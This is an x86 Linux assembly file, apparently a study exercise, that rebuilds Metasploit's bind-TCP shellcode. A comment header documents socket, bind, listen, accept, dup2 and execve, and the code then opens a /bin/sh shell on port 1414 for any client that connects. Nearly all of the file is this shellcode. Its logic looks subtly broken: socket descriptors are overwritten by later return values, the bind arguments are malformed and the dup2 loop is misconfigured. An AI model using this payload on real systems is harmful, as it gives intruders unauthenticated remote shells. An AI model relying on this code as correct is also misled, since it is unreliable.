; +==-------------------------------------==+
; |         Linux x86 Bind Shell Demo       |
; +==-------------------------------------==+
; | Author:  sp1icer                        |
; | Purpose: Build my own working demo of   |
; |             the shell_bind_tcp          |
; |             shellcode in Metasploit.    |
; +==-------------------------------------==+

; +==-------------------------------------==+
; |                GOALS                    |
; +==-------------------------------------==+
; | Goal 10/26/18: Complete re-write due to |
; |     accidental file deletion.           |
; | Goal 10/26/18: Troubleshoot why the     |
; |     connection is being refused.        |
; +==-------------------------------------==+

; +==-------------------------------------==+
; |             FOREWARNING                 |
; +==-------------------------------------==+
; |      The next section is purely         |
; |      an informational one. To see the   |
; |      code, skip to line XXX. For a file |
; |      without the header, see the file   |
; |      bind_blank.nasm.                   |
; +==-------------------------------------==+

; +==-------------------------------------==+
; |               SYSCALLS                  |
; +==-------------------------------------==+
; | SOCKETCALL 			Call #102   |
; |                                         |
; | int socketcall(int call, unsinged       |
; |                    long *args)          |
; +==-------------------------------------==+
; | calls:                                  |
; |	=> 0x1. SYS_SOCKET                  |
; |	=> 0x2. SYS_BIND                    |
; |	=> 0x4. SYS_LISTEN                  |
; |	=> 0x5. SYS_ACCEPT                  |
; +==-------------------------------------==+
; | 0x1. SYS_SOCKET                         |
; |                                         |
; | int socket(int domain, int type,        |
; |                int protocol)            |
; +==-------------------------------------==+
; | useful domains:                         |
; |                                         |
; |	=> 0x2. AF_INET                     |
; |	=> 0x3. AF_INET6                    |
; +==-------------------------------------==+
; | type:                                   |
; |                                         |
; |	=> 0x1. SOCK_STREAM                 | 
; +==-------------------------------------==+
; | protocol:                               |
; |                                         |
; |	=> 0x0. DEFAULT                     |
; +==-------------------------------------==+
; | 0x2. SYS_BIND                           |
; |                                         |
; | int bind(int sockfd, const struct       |
; |              sockaddr *addr,            |
; |              socklen_t addrlen)         |
; +==-------------------------------------==+
; | sockfd:                                 |
; |                                         |
; |	=> Output from SYS_SOCKET.          |
; +==-------------------------------------==+
; | *addr:                                  |
; |                                         |
; | struct sockaddr {                       |
; | 	sa_family_t sin_family;             |
; | 	char sin_port;                      |
; | 	struct in_addr sin_addr;            |
; | };                                      |
; |                                         |
; |	=> family: AF_INET                  |
; |	=> port: 0x8605                     |
; |	=> address: 0x0 (ANY)               |
; +==-------------------------------------==+
; | addrlen:                                |
; |                                         |
; |	=> 0x16                             |
; +==-------------------------------------==+
; | 0x4. SYS_LISTEN                         |
; |                                         |
; | int listen(int sockfd, int backlog);    |
; +==-------------------------------------==+
; | sockfd:                                 |
; |                                         |
; |	=> Output from SYS_BIND.            |
; +==-------------------------------------==+
; | backlog:                                |
; |                                         |
; |	=> Queue is limited to 2.           |
; +==-------------------------------------==+
; | 0x5. SYS_ACCEPT                         |
; |                                         |
; | int accept(int sockfd, struct           |
; |                sockaddr *addr,          |
; |                socklen_t *addrlen);     |
; +==-------------------------------------==+
; | sockfd:                                 |
; |                                         |
; |	=> Output from SYS_LISTEN.          |
; +==-------------------------------------==+
; | *addr:                                  |
; |                                         |
; | struct sockaddr {                       |
; | 	sa_family_t sin_family;             |
; | 	char sin_port;                      |
; | 	struct in_addr sin_addr;            |
; | };                                      |
; |                                         |
; |	=> family: AF_INET                  |
; |	=> port: 0x0 (ANY)                  |
; |	=> address: 0x0 (ANY)               |
; +==-------------------------------------==+
; | addrlen:                                |
; |                                         |
; |	=> 0x0 (ANY)                        |
; +==-------------------------------------==+
; | DUP2 			Call #63    |
; |                                         |
; | int dup2(int oldfd, int newfd);         |
; +==-------------------------------------==+
; | oldfd:                                  |
; |                                         |
; |	=> Output from SYS_ACCEPT.          |
; +==-------------------------------------==+
; | newfd:                                  |
; |                                         |
; |	=> 0x0: STDIN                       |
; |	=> 0x1: STDOUT                      |
; |	=> 0x2: STDERR                      |
; +==-------------------------------------==+
; | EXECVE 			Call #11    |
; |                                         |
; | int execve(const char *filename,        |
; |                char *const argv[],      |
; |                char *const envp[]);     |
; +==-------------------------------------==+
; | *filename:                              |
; |                                         |
; |	=> /bin/sh                          |
; +==-------------------------------------==+
; | argv[]:                                 |
; |                                         |
; |	=> 0x0 (NONE)                       |
; +==-------------------------------------==+
; | envp[]:                                 |
; |                                         |
; |	=> 0x0 (NONE)                       |
; +==-------------------------------------==+


; +==-------------------------------------==+
; |            THE SHELLCODE                |
; +==-------------------------------------==+

global _start

section .text
_start:
	; +==-----------------==+
	; |  CREATE THE SOCKET  |
	; +==-----------------==+

	; Load SOCKETCALL with SYS_SOCKET.
	push 0x66

	pop eax
	inc bl
	xor edi, edi ; XOR'ing to make a perma-null byte.

	; Args for SYS_SOCKET.
	push edi ; DEFAULT PROTOCOL
	push 0x1 ; SOCK_STREAM
	push 0x2 ; AF_INET
	xor ecx, ecx
	mov ecx, esp
	int 0x80

	; Save results to ESI.
	xor esi, esi
	xchg esi, eax

	; +==--------------==+
	; |  BIND TO SOCKET  |
	; +==--------------==+

	; Load SOCKETCALL with SYS_BIND.
	push 0x66
	pop eax
	inc bl

	; Args for SYS_BIND.
	push 0x16 ; ADDRLEN
	push edi ; ANY ADDRESS
	push word 0x8605 ; PORT 1414
	push 0x2 ; AF_INET
	push esi ; SOCKFD
	mov ecx, esp ; Move stack arguments into ECX

	int 0x80

	; Save result to ESI.
	xor esi,esi
	xchg esi, eax

	; +==----------------==+
	; |  LISTEN ON SOCKET  |
	; +==----------------==+

	; Load SOCKETCALL with SYS_LISTEN.
	push 0x66
	pop eax
	mov bl, 0x4

	; Args for SYS_LISTEN.
	push 0x0 ; QUEUE
	push esi ; sockfd
	mov ecx, esp

	int 0x80

	; Save result to ESI.
	xor esi, esi
	xchg esi, eax

	; +==------------------==+
	; |  ACCEPT CONNECTIONS  |
	; +==------------------==+

	; Load SOCKETCALL with SYS_ACCEPT.
	push 0x66
	pop eax
	inc bl

	; Args for SYS_ACCEPT.
	push edi ; ANY CLIENT CAN CONNECT
	push edi ; ANY CLIENT CAN CONNECT
	push 0x2 ; AF_INET
	push esi ; SOCKFD
	mov ecx, esp ; Move stack args into ECX.

	int 0x80

	; Save result to ESI.
	xor esi, esi
	xchg esi, eax

	; +==-----------------------==+
	; |  REDIRECT INPUTS/OUTPUTS  |
	; +==-----------------------==+

	; Load DUP2.
	push esi
	pop eax
	xor ecx, ecx
	jmp short loopTime

	; Loop over {0-2} to redirect STDIN/OUT/ERR.
loopTime:
	int 0x80
	inc cl
	cmp cl, 0x4
	jnz loopTime

	; +==-------------------==+
	; |  EXECVE TO GET SHELL  |
	; +==-------------------==+

	; Load EXECVE with /bin/sh.
	push 0xB
	pop eax

	; Push null byte to stack.
	xor ebx, ebx
	push ebx

	; /bin/sh reversed.
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp

	; NULL for args/envp.
	xor ecx, ecx
	xor edx, edx

	int 0x80
